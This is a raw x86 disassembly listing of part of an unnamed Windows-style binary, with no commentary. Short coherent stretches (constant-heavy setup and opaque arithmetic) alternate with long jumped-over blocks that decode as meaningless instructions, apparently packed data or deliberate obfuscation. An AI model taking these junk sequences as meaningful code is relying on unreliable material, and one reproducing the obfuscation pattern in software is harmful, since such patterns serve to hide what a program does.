  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	fstp   st(6)
  40e545:	inc    eax
  40e546:	ror    edi,0xcd
  40e549:	push   es
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0xc3d8f496
  40e554:	es adc al,0x98
  40e557:	data16 mov BYTE PTR [ecx+ebx*8-0x71],dl
  40e55c:	xchg   DWORD PTR ds:0xe2e3824f,edi
  40e562:	mov    eax,ds:0x3e51951b
  40e567:	add    al,BYTE PTR [edx+0x26d6f3b]
  40e56d:	adc    esp,DWORD PTR [edx+0x45af8a9]
  40e573:	inc    ebp
  40e574:	out    0x64,al
  40e576:	mov    cl,0xef
  40e578:	js     0x40e51a
  40e57a:	(bad)  
  40e57c:	jmp    0x40e55d
  40e57e:	out    dx,eax
  40e57f:	mov    es,WORD PTR [edi+eax*2-0x49]
  40e583:	mov    al,BYTE PTR fs:[edx-0x62e43fa7]
  40e58a:	in     al,0x9a
  40e58c:	push   0x309dbf3f
  40e591:	in     al,0xb6
  40e593:	mov    cl,0x85
  40e595:	dec    esp
  40e596:	mov    edi,0x87c9ba9
  40e59b:	push   cs
  40e59c:	lahf   
  40e59d:	(bad)  
  40e59e:	test   BYTE PTR [esi+ecx*8+0x38],0x9c
  40e5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5a4:	ror    BYTE PTR [esi-0x7a2a21d2],0x62
  40e5ab:	ja     0x40e58a
  40e5ad:	iret   
  40e5ae:	xchg   esi,eax
  40e5af:	aaa    
  40e5b0:	in     eax,dx
  40e5b1:	das    
  40e5b2:	jno    0x40e5a8
  40e5b4:	push   0xff076f27
  40e5b9:	mov    ecx,0x5bd94dfa
  40e5be:	adc    esp,DWORD PTR ds:0x61e70e22
  40e5c4:	xor    eax,0x7fad7e9a
  40e5c9:	aad    0xf3
  40e5cb:	adc    DWORD PTR [edx-0x27],0x4
  40e5cf:	mov    al,ds:0x911ed9ee
  40e5d4:	gs in  eax,dx
  40e5d6:	dec    esp
  40e5d7:	and    DWORD PTR [esi+0x2c1830fa],esi
  40e5dd:	mov    esi,0x2a825535
  40e5e2:	mov    esp,0x417197b9
  40e5e7:	cli    
  40e5e8:	icebp  
  40e5e9:	imul   eax,DWORD PTR [esi-0x4e9d618e],0xffffffa6
  40e5f0:	sbb    bl,0x6f
  40e5f3:	clc    
  40e5f4:	retf   
  40e5f5:	imul   ecx,DWORD PTR [ebp+0x16],0xffffffde
  40e5f9:	dec    ebp
  40e5fa:	ror    BYTE PTR [esi],cl
  40e5fc:	or     edi,0x7981f9fb
  40e602:	or     edi,DWORD PTR [esi+0x2c]
  40e605:	mov    eax,0x31e49551
  40e60a:	xchg   edi,eax
  40e60b:	push   ebx
  40e60c:	xchg   DWORD PTR [eax+0x33],ecx
  40e60f:	and    esi,DWORD PTR [esi+eax*8]
  40e612:	sbb    eax,DWORD PTR [ebx]
  40e614:	dec    ebp
  40e615:	mov    bh,0xff
  40e617:	xor    BYTE PTR [ebx+0x2d],cl
  40e61a:	push   ecx
  40e61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e61c:	dec    edx
  40e61d:	push   edi
  40e61e:	cmp    eax,0xb50a9e10
  40e623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e624:	bnd jb 0x40e5ed
  40e627:	push   ecx
  40e628:	fld    QWORD PTR [eax+0x31]
  40e62b:	cmp    ah,0x8
  40e62e:	dec    ecx
  40e62f:	add    al,al
  40e631:	mov    edi,gs
  40e633:	ja     0x40e65d
  40e635:	outs   dx,BYTE PTR ds:[esi]
  40e636:	iret   
  40e637:	fwait
  40e638:	pop    eax
  40e639:	bound  edx,QWORD PTR [edi]
  40e63b:	(bad)  
  40e63d:	mov    dh,0xa7
  40e63f:	mov    edx,DWORD PTR [edx-0x39]
  40e642:	and    al,0xee
  40e644:	jecxz  0x40e69c
  40e646:	and    BYTE PTR [edi+0x1],ah
  40e649:	loopne 0x40e64c
  40e64b:	xor    al,0xa8
  40e64d:	ja     0x40e689
  40e64f:	fstp   TBYTE PTR [edx+eax*2+0x18]
  40e653:	(bad)  
  40e654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e655:	push   esp
  40e656:	std    
  40e657:	adc    eax,0x3ed5718a
  40e65c:	popa   
  40e65d:	dec    ecx
  40e65e:	mov    esi,0x693014bf
  40e663:	pop    ecx
  40e664:	fmul   QWORD PTR [ebx+ebx*1]
  40e667:	(bad)  
  40e668:	(bad)
  40e66b:	pushf  
  40e66c:	xor    BYTE PTR [ebp-0x7003423e],dl
  40e672:	aas    
  40e673:	add    eax,0x4f443db0
  40e678:	retf   0x3db9
  40e67b:	xor    edi,ecx
  40e67d:	xor    dl,BYTE PTR [ebx-0x5c]
  40e680:	addr16 js 0x40e6c8
  40e683:	mov    ds:0x754fd397,al
  40e688:	ins    BYTE PTR es:[edi],dx
  40e689:	out    0x83,al
  40e68b:	pop    ds
  40e68c:	outs   dx,BYTE PTR ds:[esi]
  40e68d:	cld    
  40e68e:	test   BYTE PTR [edi-0x87c5614],ah
  40e694:	inc    ebx
  40e695:	and    eax,0x1d1797d8
  40e69a:	pusha  
  40e69b:	(bad)  
  40e69c:	stc    
  40e69d:	mov    eax,0x6bb94114
  40e6a2:	mov    edx,0x1cb6fd09
  40e6a7:	test   DWORD PTR [ebp-0x80],ebx
  40e6aa:	into   
  40e6ab:	cmp    BYTE PTR [ecx-0x73],0xa0
  40e6af:	loope  0x40e6b9
  40e6b1:	stc    
  40e6b2:	jnp    0x40e6f9
  40e6b4:	xor    eax,0x2a313400
  40e6b9:	xor    BYTE PTR [esi],dh
  40e6bb:	xor    BYTE PTR [esi-0x33],bh
  40e6be:	repnz dec esp
  40e6c0:	icebp  
  40e6c1:	dec    edx
  40e6c2:	fisttp QWORD PTR [ecx+ebp*4+0x5d5dc09b]
  40e6c9:	dec    ebp
  40e6ca:	nop
  40e6cb:	jecxz  0x40e6bf
  40e6cd:	sahf   
  40e6ce:	inc    edi
  40e6cf:	pop    ss
  40e6d0:	jle    0x40e652
  40e6d2:	xor    DWORD PTR [ebp-0xf44e5d0],edi
  40e6d8:	inc    ecx
  40e6d9:	mov    ebx,0xfb18be8c
  40e6de:	pop    ebx
  40e6df:	add    al,0xd7
  40e6e1:	mov    ecx,0x2ab10702
  40e6e6:	or     al,0xe3
  40e6e8:	loop   0x40e710
  40e6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6eb:	stos   BYTE PTR es:[edi],al
  40e6ec:	(bad)  [eax+0x53]
  40e6ef:	jno    0x40e755
  40e6f1:	mov    BYTE PTR [eax],0x7
  40e6f4:	jle    0x40e746
  40e6f6:	pushf  
  40e6f7:	aad    0xfd
  40e6f9:	jge    0x40e6ca
  40e6fb:	sub    DWORD PTR ds:0x7355eded,edx
  40e701:	pop    ds
  40e702:	sbb    DWORD PTR [edx+0x4d327a43],edx
  40e708:	stos   BYTE PTR es:[edi],al
  40e709:	inc    edi
  40e70a:	sub    DWORD PTR [ebx-0x2d],ecx
  40e70d:	shl    al,cl
  40e70f:	sbb    DWORD PTR [edi+0x41],edx
  40e712:	repnz push ebp
  40e714:	shl    BYTE PTR [ebp-0x2fce50fe],cl
  40e71a:	cdq    
  40e71b:	push   ss
  40e71c:	jno    0x40e766
  40e71e:	jmp    0x40e6e2
  40e720:	pop    ebp
  40e721:	popf   
  40e722:	or     ecx,DWORD PTR [ecx-0x385fa7bc]
  40e728:	outs   dx,BYTE PTR ds:[esi]
  40e729:	xchg   edx,eax
  40e72a:	pop    esi
  40e72b:	adc    dl,BYTE PTR [esp+edx*4]
  40e72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e72f:	fbstp  TBYTE PTR [esi+0x4bd997dd]
  40e735:	jo     0x40e6d0
  40e737:	outs   dx,BYTE PTR ds:[esi]
  40e738:	pushf  
  40e739:	jbe    0x40e6c0
  40e73b:	add    al,0xc8
  40e73d:	cs test eax,0x58bd02df
  40e743:	jb     0x40e725
  40e745:	dec    edi
  40e746:	jecxz  0x40e7c2
  40e748:	push   ss
  40e749:	jecxz  0x40e764
  40e74b:	and    eax,0xe66fb2a2
  40e750:	ret    0x99cf
  40e753:	adc    ah,BYTE PTR fs:[edi+0x10]
  40e757:	cmp    BYTE PTR [esp+edi*2-0x7cae6b9d],0xfe
  40e75f:	mov    dh,0x1
  40e761:	adc    al,0xad
  40e763:	ret    
  40e764:	pop    edx
  40e765:	jle    0x3eb238c9
  40e76b:	xor    cl,dl
  40e76d:	fild   QWORD PTR [ebp+0x51]
  40e770:	or     eax,0xe085127d
  40e775:	cmp    BYTE PTR [edx+eax*8],al
  40e778:	and    al,BYTE PTR [edi]
  40e77a:	cmp    ebp,DWORD PTR [edi+0x45ec83ea]
  40e780:	cmp    al,0x79
  40e782:	outs   dx,BYTE PTR ds:[esi]
  40e783:	or     BYTE PTR ds:0x5ff5b0f7,0xf0
  40e78a:	xchg   edx,eax
  40e78b:	outs   dx,BYTE PTR ds:[esi]
  40e78c:	outs   dx,BYTE PTR ds:[esi]
  40e78d:	dec    ebp
  40e78e:	xor    eax,0xb4c59013
  40e793:	add    DWORD PTR [ebx+0x126c4057],edi
  40e799:	jle    0x40e7ad
  40e79b:	add    edx,edi
  40e79d:	in     eax,0x13
  40e79f:	mov    bl,0x17
  40e7a1:	(bad)  
  40e7a2:	lods   eax,DWORD PTR ds:[esi]
  40e7a3:	les    esi,FWORD PTR [esi+0x27]
  40e7a6:	or     ebx,DWORD PTR [ecx]
  40e7a8:	and    al,0x5c
  40e7aa:	aas    
  40e7ab:	imul   ebx,DWORD PTR [edx],0xbd588015
  40e7b1:	sbb    eax,0xe98c46e3
  40e7b6:	aam    0x97
  40e7b8:	repnz in al,0xda
  40e7bb:	ret    
  40e7bc:	mov    ecx,0xa32aa203
  40e7c1:	fistp  QWORD PTR [eax+0x43d2]
  40e7c7:	sub    eax,ecx
  40e7c9:	add    eax,DWORD PTR [ebp+0xc]
  40e7cc:	xor    edx,edx
  40e7ce:	add    eax,DWORD PTR [ebp-0x14]
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax+0x448ea1cf]
  40e85d:	(bad)  [edx+0x1bebe0a]
  40e863:	les    edi,FWORD PTR [esi-0x2fc67a42]
  40e869:	mov    ch,BYTE PTR [edx-0x270162ba]
  40e86f:	mov    eax,0x361eb870
  40e874:	pop    ds
  40e875:	aas    
  40e876:	fsub   st(4),st
  40e878:	jmp    0x9bb19aa6
  40e87d:	pop    ebp
  40e87e:	sbb    esi,ecx
  40e880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e881:	cmovs  eax,esp
  40e884:	mov    edx,DWORD PTR [ecx]
  40e886:	pop    ebp
  40e887:	pop    eax
  40e888:	dec    ebp
  40e889:	cmp    BYTE PTR [eax-0x74565e0c],bl
  40e88f:	xchg   edi,eax
  40e890:	add    eax,0x7c70e45c
  40e895:	and    al,BYTE PTR [esp+esi*1-0x573fe792]
  40e89c:	sub    al,BYTE PTR [esi-0x6ec75adb]
  40e8a2:	stos   BYTE PTR es:[edi],al
  40e8a3:	push   ss
  40e8a4:	ficom  WORD PTR [edx+edx*4-0xf]
  40e8a8:	call   0xc61fe683
  40e8ad:	maxps  xmm4,xmm4
  40e8b0:	fsubr  QWORD PTR [eax]
  40e8b2:	rcr    BYTE PTR [edi+eiz*1+0x5a4438e2],0x14
  40e8ba:	icebp  
  40e8bb:	adc    al,0xcb
  40e8bd:	(bad)  
  40e8bf:	jg     0x40e935
  40e8c1:	dec    ecx
  40e8c2:	fcom   DWORD PTR [esi+eiz*1-0x62]
  40e8c6:	xchg   esp,eax
  40e8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c8:	mov    ebx,0x15eb2ad
  40e8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8ce:	xor    BYTE PTR [edx+esi*8+0x3370b135],bh
  40e8d5:	fldenv [esi-0x8802b45]
  40e8db:	aad    0xde
  40e8dd:	mov    ah,0xdd
  40e8df:	mov    ebp,0x1a4cb74f
  40e8e4:	cmp    DWORD PTR [ebx],ecx
  40e8e6:	shl    BYTE PTR [ecx+0x4ae22c3],cl
  40e8ec:	xor    bl,BYTE PTR [esi]
  40e8ee:	sahf   
  40e8ef:	test   al,0xbd
  40e8f1:	dec    eax
  40e8f2:	ja     0x40e892
  40e8f4:	repnz out dx,al
  40e8f6:	(bad)  
  40e8f7:	ret    0xb481
  40e8fa:	pop    edi
  40e8fb:	xchg   ecx,eax
  40e8fc:	fcom   QWORD PTR [ebx]
  40e8fe:	push   esi
  40e8ff:	dec    ebp
  40e900:	add    BYTE PTR [esi],ah
  40e902:	mov    ah,0x24
  40e904:	adc    eax,0xc43b0e0e
  40e909:	sbb    eax,0xff1ce080
  40e90e:	ret    
  40e90f:	mov    eax,0x348b87ed
  40e914:	sbb    BYTE PTR [ebp+0x1a1e5b00],al
  40e91a:	outs   dx,DWORD PTR ds:[esi]
  40e91b:	(bad)  
  40e91c:	sbb    edx,DWORD PTR [ebx+ecx*8+0x37]
  40e920:	pop    ecx
  40e921:	xchg   esp,eax
  40e922:	or     dl,0xdd
  40e925:	stos   DWORD PTR es:[edi],eax
  40e926:	gs xchg ebp,eax
  40e928:	mov    bh,0x65
  40e92a:	mov    DWORD PTR [esi],0x2487926d
  40e930:	outs   dx,DWORD PTR ds:[esi]
  40e931:	inc    ebp
  40e932:	cmp    ch,BYTE PTR [edi-0x360c1762]
  40e938:	test   BYTE PTR [ecx-0x44],0x65
  40e93c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e93e:	lock and edi,DWORD PTR [esi]
  40e941:	out    dx,eax
  40e942:	enter  0x7912,0xfd
  40e946:	retf   
  40e947:	sub    dh,al
  40e949:	leave  
  40e94a:	mov    edx,DWORD PTR [edi+0x19]
  40e94d:	scas   al,BYTE PTR es:[edi]
  40e94e:	stos   BYTE PTR es:[edi],al
  40e94f:	aaa    
  40e950:	jecxz  0x40e988
  40e952:	push   0x45
  40e954:	sub    al,0x99
  40e956:	repz mov ch,0xc2
  40e959:	adc    cl,BYTE PTR [edi]
  40e95b:	data16 or al,BYTE PTR [ebx+0x12]
  40e95f:	cmp    esi,DWORD PTR [ecx-0x2f3fc711]
  40e965:	mov    ah,0xf3
  40e967:	pop    ss
  40e968:	add    al,ch
  40e96a:	cmp    al,0xf4
  40e96c:	dec    ecx
  40e96d:	arpl   WORD PTR [ebx],dx
  40e96f:	call   0x46621545
  40e974:	push   ebp
  40e975:	ins    BYTE PTR es:[edi],dx
  40e976:	aas    
  40e977:	sub    dl,BYTE PTR [esp+eiz*4+0x6b]
  40e97b:	mov    ss,WORD PTR [esi+ebx*2-0x53]
  40e97f:	int3   
  40e980:	xor    al,0x0
  40e982:	pop    esp
  40e983:	fwait
  40e984:	js     0x40e9f5
  40e986:	out    dx,eax
  40e987:	adc    bh,BYTE PTR [ecx]
  40e989:	xor    ebp,ebx
  40e98b:	loopne 0x40e961
  40e98d:	mov    ebx,es
  40e98f:	(bad)  [eax+0xa]
  40e992:	or     ecx,DWORD PTR [ebx]
  40e994:	xchg   edi,eax
  40e995:	pop    edx
  40e996:	es cli 
  40e998:	or     BYTE PTR [eax+0x5f],dh
  40e99b:	cmp    bl,BYTE PTR [ebx+0xb0074be]
  40e9a1:	or     al,0x1b
  40e9a3:	lods   eax,DWORD PTR ds:[esi]
  40e9a4:	out    dx,al
  40e9a5:	xchg   edx,eax
  40e9a6:	aaa    
  40e9a7:	dec    eax
  40e9a8:	and    BYTE PTR gs:[esi-0x4f263f97],dh
  40e9af:	mov    ch,0x6b
  40e9b1:	loop   0x40e993
  40e9b3:	sub    edi,DWORD PTR [ebp-0x320ef87a]
  40e9b9:	ss jo  0x40e965
  40e9bc:	lahf   
  40e9bd:	fimul  DWORD PTR [eax-0x49]
  40e9c0:	ss mov fs:0x39808230,al
  40e9c7:	mov    edx,ebp
  40e9c9:	cmp    ebx,DWORD PTR [edi+0x7c]
  40e9cc:	aaa    
  40e9cd:	dec    edx
  40e9ce:	jns    0x40ea22
  40e9d0:	iret   
  40e9d1:	dec    ebx
  40e9d2:	lods   eax,DWORD PTR ds:[esi]
  40e9d3:	inc    edx
  40e9d4:	xchg   ecx,eax
  40e9d5:	aaa    
  40e9d6:	fcomp  DWORD PTR [ebp-0x33357673]
  40e9dc:	jmp    0x2c40:0xa2111b27
  40e9e3:	xor    eax,0x88140a88
  40e9e8:	xor    eax,DWORD PTR [edx]
  40e9ea:	xchg   ebx,eax
  40e9ec:	add    ch,BYTE PTR [esi-0x147c810c]
  40e9f2:	test   eax,0xe59a12fb
  40e9f7:	lea    esi,[ebp-0x7ab0cc2a]
  40e9fd:	arpl   dx,bp
  40e9ff:	fadd   DWORD PTR [ebp+0x0]
  40ea02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea03:	jle    0x40e9a5
  40ea05:	xor    eax,DWORD PTR [ebx+0x5f]
  40ea08:	pusha  
  40ea09:	in     eax,dx
  40ea0a:	jl     0x40ea59
  40ea0c:	nop
  40ea0d:	xor    BYTE PTR [eax*1-0x12fba4cf],ah
  40ea14:	jbe    0x40ea0e
  40ea16:	pop    edi
  40ea17:	push   es
  40ea18:	push   es
  40ea19:	add    eax,0x696b9fbe
  40ea1e:	sar    DWORD PTR [edx],1
  40ea20:	mov    WORD PTR [esi],gs
  40ea22:	icebp  
  40ea23:	mov    eax,ds:0x49db2f69
  40ea28:	fmul   st(7),st
  40ea2a:	fld1   
  40ea2c:	xor    BYTE PTR [edi+0x670d69b9],al
  40ea32:	and    BYTE PTR [ebx-0x2e],al
  40ea35:	stos   DWORD PTR es:[edi],eax
  40ea36:	cmp    esp,0xcd7b82e4
  40ea3c:	cmp    ecx,ebp
  40ea3e:	call   0x8982fc7f
  40ea43:	jp     0x40ea6f
  40ea45:	cmc    
  40ea46:	test   eax,0x352738b3
  40ea4b:	jl     0x40ea2d
  40ea4d:	es retf 
  40ea4f:	xchg   esi,eax
  40ea50:	lock add al,0x3d
  40ea53:	retf   0xd674
  40ea56:	sahf   
  40ea57:	mov    ah,0x3d
  40ea59:	into   
  40ea5a:	mul    edx
  40ea5c:	aad    0x94
  40ea5e:	fst    DWORD PTR [esi]
  40ea60:	fld    DWORD PTR [ebx-0x62ba603c]
  40ea66:	rcl    BYTE PTR [ebx],0x22
  40ea69:	sar    BYTE PTR [ebp+0x4cdfa2c8],0x12
  40ea70:	and    BYTE PTR [edi],bl
  40ea72:	mov    ?,WORD PTR [ebx-0x4519aad2]
  40ea78:	pop    ecx
  40ea79:	inc    eax
  40ea7a:	push   esp
  40ea7b:	sbb    DWORD PTR [edx+ebx*1+0x2b],esp
  40ea7f:	dec    esp
  40ea80:	(bad)  
  40ea81:	out    0xb0,al
  40ea83:	jg     0x40ea11
  40ea85:	sbb    bl,BYTE PTR [ebx+0x63784789]
  40ea8b:	xchg   BYTE PTR [ebp-0xef7a3c7],bl
  40ea91:	popa   
  40ea92:	sub    eax,DWORD PTR [edx+0x7bf4f334]
  40ea98:	enter  0x18bd,0x1f
  40ea9c:	dec    esp
  40ea9d:	gs pop ecx
  40ea9f:	sub    ah,BYTE PTR [edi-0xcc30ab4]
  40eaa5:	mov    esi,0x94e05482
  40eaaa:	ins    DWORD PTR es:[edi],dx
  40eaab:	popf   
  40eaac:	aam    0xd5
  40eaae:	gs xor dl,bh
  40eab1:	lods   al,BYTE PTR ds:[esi]
  40eab2:	or     BYTE PTR [edi-0x1a41bf33],al
  40eab8:	cli    
  40eab9:	sub    dl,BYTE PTR [esi-0x1679ed13]
  40eabf:	cs and al,0x19
  40eac2:	fdivr  QWORD PTR [eax-0x46]
  40eac5:	adc    ch,ah
  40eac7:	lods   al,BYTE PTR ds:[esi]
  40eac8:	ja     0x40ea6f
  40eaca:	pushf  
  40eacb:	cld    
  40eacc:	jge    0x40ea6b
  40eace:	push   0xffffff8d
  40ead0:	or     dh,BYTE PTR [edx-0x608d1262]
  40ead6:	add    BYTE PTR [edx+ecx*2],0x0
  40eada:	das    
  40eadb:	jae    0x40eb17
  40eadd:	jb     0x40ea8d
  40eadf:	fadd   st,st(5)
  40eae1:	cmp    edx,DWORD PTR [ebx-0x1]
  40eae4:	mov    dl,0x57
  40eae6:	test   eax,0x52fdc3b5
  40eaeb:	and    DWORD PTR [eax-0x29],ecx
  40eaee:	lock cmp al,0x8
  40eaf1:	loop   0x40ea7a
  40eaf3:	mov    esi,0x57d9f1cc
  40eaf8:	pop    ss
  40eaf9:	push   esp
  40eafa:	dec    ebp
  40eafb:	stos   DWORD PTR es:[edi],eax
  40eafc:	fsub   QWORD PTR [edi]
  40eafe:	sub    BYTE PTR [esi-0x45839694],dl
  40eb04:	xchg   esi,eax
  40eb05:	xchg   ecx,eax
  40eb06:	dec    ebp
  40eb07:	enter  0xb387,0xce
  40eb0b:	adc    DWORD PTR [ebp+0x8],ebx
  40eb0e:	call   0xabe6:0x6b786a6a
  40eb15:	sahf   
  40eb16:	mov    esi,0x6ef99feb
  40eb1b:	(bad)  
  40eb1c:	aam    0x60
  40eb1e:	shr    bl,0x3a
  40eb21:	imul   esi,DWORD PTR [ecx+0x6b42d80],0x72
  40eb28:	push   edi
  40eb29:	or     DWORD PTR [edx],eax
  40eb2b:	hlt    
  40eb2c:	mov    DWORD PTR [esi],edx
  40eb2e:	push   esp
  40eb2f:	shl    DWORD PTR [edx+0x1d],1
  40eb32:	dec    esi
  40eb33:	pop    edi
  40eb34:	(bad)  
  40eb35:	sub    edx,DWORD PTR [edx-0x22]
  40eb38:	sbb    dl,ch
  40eb3a:	test   al,0xdf
  40eb3c:	xchg   ebx,eax
  40eb3d:	add    al,0xc7
  40eb3f:	or     DWORD PTR [ebp+0x2c],esp
  40eb42:	call   0x12d7:0xded6195b
  40eb49:	bound  eax,QWORD PTR [eax+ecx*2-0xc]
  40eb4d:	jmp    0x40ebac
  40eb4f:	add    eax,0xc1e3e54
  40eb54:	lea    esp,[ecx]
  40eb56:	es loopne 0x40ebd0
  40eb59:	ins    BYTE PTR es:[edi],dx
  40eb5a:	mov    ecx,ecx
  40eb5c:	fisttp WORD PTR [ebp-0x175155ec]
  40eb62:	xchg   ebx,eax
  40eb63:	mov    ebx,0x142d92dd
  40eb68:	jl     0x40eb43
  40eb6a:	test   al,0x1b
  40eb6c:	cmp    DWORD PTR fs:[ebx],ebp
  40eb6f:	add    eax,0x8ee25d84
  40eb74:	xchg   DWORD PTR [ecx-0x6a6afcef],ecx
  40eb7a:	add    al,0xb9
  40eb7c:	push   cs
  40eb7d:	sahf   
  40eb7e:	inc    ebp
  40eb7f:	adc    DWORD PTR [edx-0x7d81bd66],0x4b
  40eb86:	cdq    
  40eb87:	mov    BYTE PTR [ecx],bh
  40eb89:	sbb    bh,BYTE PTR [ebx-0x68]
  40eb8c:	mov    DWORD PTR [ebp-0x60],0x4197
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x422728
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x422728
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
